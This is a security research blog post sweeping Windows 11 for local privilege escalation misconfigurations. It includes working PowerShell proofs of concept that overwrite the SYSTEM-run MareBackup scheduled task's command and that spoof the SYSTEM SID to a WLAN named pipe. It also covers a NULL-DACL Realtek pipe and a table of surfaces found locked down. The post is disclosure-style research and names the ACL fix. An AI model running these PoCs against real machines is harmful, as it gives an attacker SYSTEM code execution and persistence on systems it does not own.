# https://bikini.github.io/blog/2026-05-07-windows/

exploits

May 7, 2026

# windows 11 — SYSTEM-context scheduled task writable by any user, world-writable named pipes with SID spoofing, and what the local privilege escalation surface looks like after a thorough sweep

* * *

I spent a few days scanning Windows 11 for local privilege escalation primitives. Not looking at kernel exploits or driver bugs — looking at the _configuration surface_: scheduled tasks, named pipes, services, COM objects, registry loadpoints, WMI subscriptions, device ACLs, AppX manifests. The kind of misconfigurations that give you SYSTEM from a medium-integrity unprivileged shell because someone set an ACL wrong or trusted a client-supplied value in a named pipe protocol.

The strongest confirmed finding is a **Microsoft-signed scheduled task (`MareBackup`)** whose task definition file is writable by `BUILTIN\Users` due to an embedded SDDL granting `GenericAll`. The task runs as SYSTEM. Overwrite the task definition → SYSTEM code execution on next scheduler reload or reboot. Not instant, but persistent and reliable.

The second finding is a **world-writable named pipe (`WiFiNetworkManagerTask`)** where the listening service (`WlanSvc`) trusts a client-supplied SID at offset 0x14 of the init message. You can claim to be SYSTEM (`S-1-5-18`), and the service responds accordingly.

The third is a **NULL-DACL named pipe** exposed by Realtek’s HD Audio Universal Service running as LocalSystem. World-accessible, no authentication.

After those three, I swept 20+ additional attack surface classes and found nothing stronger than MareBackup. The kernel surface (KSecDD, PEAuth) has interesting IOCTL maps but the sensitive operations are gated behind protected-process and admin checks that hold up.

## MareBackup — SYSTEM task writable by any user

`\Microsoft\Windows\Application Experience\MareBackup` is a Microsoft-signed scheduled task that runs as `NT AUTHORITY\SYSTEM`. The task definition XML is stored in `C:\Windows\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup`. The embedded SDDL in the task’s security descriptor grants `GenericAll` to `BUILTIN\Users`:

```
$task = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Application Experience\" -TaskName "MareBackup"
$sd = $task.Settings.SecurityDescriptor
# SDDL contains: (A;;GA;;;BU) — GenericAll to BUILTIN\Users
```

From a medium-integrity shell (standard user, no elevation):

```
# verify read/write access to the task definition file
$path = "C:\Windows\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup"
$acl = Get-Acl $path
$acl.Access | Where-Object { $_.IdentityReference -match "Users" } | Format-Table

# IdentityReference      FileSystemRights  AccessControlType
# ------------------     ----------------  -----------------
# BUILTIN\Users          FullControl       Allow
```

The task action specifies a command that runs as SYSTEM. Rewriting the task XML to change the `<Exec><Command>` element gives you arbitrary SYSTEM code execution. The limitation: the Task Scheduler’s COM interface rejects live modifications from an unelevated context (`E_ACCESSDENIED`), so direct XML edits aren’t reflected until the scheduler reloads — either on reboot or when the Task Scheduler service restarts.

```
# PoC: overwrite task definition with modified action
$xml = [xml](Get-Content $path)
$ns = New-Object Xml.XmlNamespaceManager($xml.NameTable)
$ns.AddNamespace("t", "http://schemas.microsoft.com/windows/2004/02/mit/task")

$exec = $xml.SelectSingleNode("//t:Exec/t:Command", $ns)
$exec.InnerText = "cmd.exe /c whoami > C:\Windows\Temp\marebackup_proof.txt"

$xml.Save($path)
# after reboot or scheduler restart: SYSTEM shell writes proof file
```

This is a delayed/persistent SYSTEM code execution primitive. Not instant exploitation — but in the context of a multi-step attack where you’ve already landed on the box, it’s a clean persistence mechanism that survives reboots and fires under the SYSTEM context. The fact that it’s a Microsoft-signed task definition with a GenericAll ACE for Users is the root cause — the SDDL should never have granted write access to unprivileged accounts.

## WiFiNetworkManagerTask — world-writable pipe with SID spoofing

`\\.\pipe\WiFiNetworkManagerTask` is a named pipe created by the Windows WLAN Service (`WlanSvc`). The pipe’s SDDL grants write access to everyone:

```
# enumerate pipe DACL
$pipe = [System.IO.Pipes.NamedPipeClientStream]::new(".", "WiFiNetworkManagerTask", [System.IO.Pipes.PipeDirection]::InOut)
$pipe.Connect(5000)
# connection succeeds from medium-integrity token — world-writable confirmed
```

The service reads an init message from the client and trusts the SID field at byte offset 0x14. No verification against the actual client token. You can send SYSTEM’s SID (`S-1-5-18`) and the service treats you as SYSTEM for subsequent operations:

```
# structure: [header(20 bytes)][SID at offset 0x14][payload]
$ms = New-Object System.IO.MemoryStream
$bw = New-Object System.IO.BinaryWriter($ms)

# header
$bw.Write([uint32]1)    # message type: init
$bw.Write([uint32]0)    # flags
$bw.Write([uint32]0)    # reserved
$bw.Write([uint32]0)    # reserved
$bw.Write([uint32]0)    # reserved

# SID: S-1-5-18 (SYSTEM)
$systemSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
$sidBytes = New-Object byte[] $systemSid.BinaryLength
$systemSid.GetBinaryForm($sidBytes, 0)
$bw.Write($sidBytes)

$pipe.Write($ms.ToArray(), 0, $ms.Length)
$pipe.Flush()

# read response — service writes back data push assuming we are SYSTEM
$buf = New-Object byte[] 4096
$n = $pipe.Read($buf, 0, $buf.Length)
[System.Text.Encoding]::UTF8.GetString($buf, 0, $n)
```

The service acknowledges the spoofed identity and pushes data back. What you can do with the spoofed context depends on the service’s internal protocol — it manages WiFi network state, connection identifiers, and credential handles. The confirmed capabilities are SID spoofing and connection ID manipulation. I was not able to escalate this to arbitrary code execution or credential extraction in the time I spent on it, but the trust-client-supplied-SID pattern is a clear design flaw.

Initial testing suggested pipe monopoly DoS and service crash were also possible, but those turned out to be Frida instrumentation artifacts — the service didn’t actually crash when tested without the debugger attached.

## Realtek HD Audio — NULL-DACL pipe to LocalSystem

Realtek’s HD Audio Universal Service runs as `NT AUTHORITY\SYSTEM` and exposes a named pipe at `\\.\pipe\RtkAudUServiceNamedPipe` with a **NULL DACL** — meaning the pipe has no access control at all. Any process on the system can connect.

```
# verify NULL DACL
$pipe = [System.IO.Pipes.NamedPipeClientStream]::new(".", "RtkAudUServiceNamedPipe", [System.IO.Pipes.PipeDirection]::InOut)
$pipe.Connect(3000)
# connection succeeds — no access denied

# the service also exposes COM: CLSID {615AC66B-72C3-4DEB-8F22-19B372142787}
```

The service accepts messages over the pipe and exposes COM methods. The attack surface exists — a LocalSystem service with a world-accessible pipe is a classic EoP target — but exploiting it requires understanding the Realtek-proprietary protocol spoken over the pipe. This is a “the door is unlocked, the hallway is long” situation. The pipe is wide open; whether you can reach something useful through it requires more RE of the Realtek service binary than I invested. Flagging it as a confirmed exposed surface for anyone who wants to dig deeper.

## the kernel surface — KSecDD and PEAuth

Two kernel devices stood out during surface scanning as interesting targets:

**KSecDD** (`\Device\KSecDD`) has a rich IOCTL surface. I recovered the static IOCTL dispatch map from the `KSecDD!FastIoDeviceControl` handler. The sensitive primitives include pool/VM memory copy, LSA handle duplication, protected-process operations, and callback handler registration. However, the gating is solid: sensitive IOCTLs return `STATUS_ACCESS_DENIED` for non-admin, non-protected callers. I didn’t find a bypass.

**PEAuth** (`\Device\PEAuth`) accepts a single IOCTL (`0x9c412400`). The driver has interesting imports (`MmCopyVirtualMemory`, `ZwAllocateVirtualMemory`, `ZwDuplicateToken`) but the IOCTL validation rejects unprivileged callers before reaching any sensitive codepath.

**Bfs** (`\Device\Bfs`) is openable from a medium-integrity token. IOCTL `0x228004` accepts a structured request with a caller token handle and NT path. But it returns `0xC000A200` — “operation only valid in app container” — gating the interesting functionality to app-container contexts only.

**Ahcache** (`\\.\ahcache`) is also user-openable. It has cache management commands, but the privileged operations return access denied. Only harmless query commands succeed from a standard user token.

## the broader surface scan

After confirming MareBackup as the strongest finding, I systematically scanned 20+ additional attack surface classes to make sure I wasn’t missing something better. None of these yielded a stronger primitive:

| Surface | Method | Result |
| --- | --- | --- |
| Service ACLs | `sc sdshow` on all services — check WRITE\_DAC, WRITE\_OWNER, SERVICE\_CHANGE\_CONFIG | 0 writable services from medium-integrity |
| Service binary paths | Check write access to every service binary | 0 writable binaries |
| Device ACLs | Open `\Device\*` namespace, check GenericWrite/GenericAll | Bfs and Ahcache openable, gated as described above |
| Named pipes | Full enumeration with SDDL analysis | WiFiNetworkManagerTask and RtkAudUServiceNamedPipe only interesting ones |
| WMI subscriptions | Attempt permanent event subscription from standard user | Access denied on all namespace writes |
| WMI namespace ACLs | Recursive namespace DACL enumeration | All writable namespaces are low-value |
| COM server registration | 16,479 HKLM registrations scanned for elevation flags, writability | 1 potentially plantable target (weaker than MareBackup) |
| HKLM registry loadpoints | 59 high-value autorun/loadpoint keys checked | 0 writable from medium-integrity |
| AppX manifests | 3,776 application rows analyzed for writable targets | 0 writable from medium-integrity |
| AlwaysInstallElevated | Registry check for MSI elevation policy | Not set (default safe) |
| Unquoted service paths | Parse all service ImagePath values for spaces without quotes | None exploitable (all quoted or no spaces in writable segments) |
| DLL search order | Check service/task DLL dependencies in writable directories | None found |
| Scheduled task ACLs | Full task tree enumeration with embedded SDDL parsing | MareBackup is the only one with user-writable SDDL |
| Task action target writability | Check if task command targets are in writable paths | 0 writable (all in System32 or Program Files) |
| WSL COM interfaces | Probe LxssUserSession and IWslSupport | Read-only enumeration succeeds, no write/execute primitives |
| RPC endpoints | Survey high-privilege RPC servers | embeddedmodesvc has 3 marshaled methods, all gated |

The surface is well-locked-down on a default Windows 11 install. MareBackup is the exception — a single misconfigured SDDL on a SYSTEM-context task definition that grants full control to unprivileged users. Everything else either has proper ACLs, is gated behind admin/protected-process checks, or requires preconditions that don’t exist on default configurations.

## bottom line

MareBackup is the only confirmed Windows OS privilege escalation with a validated impact path from this sweep. It’s a configuration-class bug — wrong ACL on a task definition — not a code-execution vulnerability. The fix is trivial: remove the `(A;;GA;;;BU)` ACE from the task’s SDDL. Whether it’s impactful depends on your threat model: if you assume the attacker already has a low-privilege shell and you care about persistence, it’s a clean SYSTEM persistence mechanism that requires no exploit development. If you need instant interactive SYSTEM access, this isn’t it — it fires on scheduler reload, not on demand.

The WiFi pipe SID spoofing is architecturally interesting and the Realtek NULL-DACL pipe is a wide-open surface to a SYSTEM service, but neither yielded confirmed privilege escalation in the time I spent. They’re leads for anyone willing to invest more RE time into the service protocols.